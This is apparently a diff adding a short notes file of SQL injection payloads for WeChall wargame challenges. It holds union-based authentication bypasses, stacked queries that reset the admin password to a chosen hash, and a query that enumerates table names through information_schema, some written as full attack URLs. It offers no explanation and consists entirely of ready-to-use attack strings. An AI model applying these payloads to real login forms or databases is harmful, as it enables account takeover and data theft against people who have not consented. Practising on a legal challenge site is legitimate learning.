@@ -1,0 +1,13 @@
+SELECT * FROM users WHERE username='admin' Union(INSERT INTO users (username,password) VALUES('admin','asd123')) or '1'='2'
+admin' UNION UPDATE users SET users.password='Asdf123' WHERE users.username='admin'--
+'; UPDATE users SET password='444bcb3a3fcf8389296c49467f27e1d6' WHERE username='admin''
+http://www.wechall.net/challenge/training/mysql/auth_bypass2/index.php?username=%27;%20UPDATE%20users%20SET%20password=%27444bcb3a3fcf8389296c49467f27e1d6%27%20WHERE%20username=%27admin%27%27
+http://www.wechall.net/challenge/table_names/challenge.php?username=' union select database(),2,group_concat(0x3f,table_name) from information_schema.tables where table_schema=database() -- -&password=test&login=login
+http://www.wechall.net/challenge/table_names/challenge.php?username=' union select * from users where username='admin' -- -&password=test&login=login
+wyl' union select 1,'admin',md5('2') --  &password=2
+
+'union select 1,'admin' as username, md5('1') as password from users where username='admin
+1
+moo' UNION SELECT userid,username,md5('moo') FROM users WHERE username='admin
+moo
+'union select 1,'admin',md5('') #
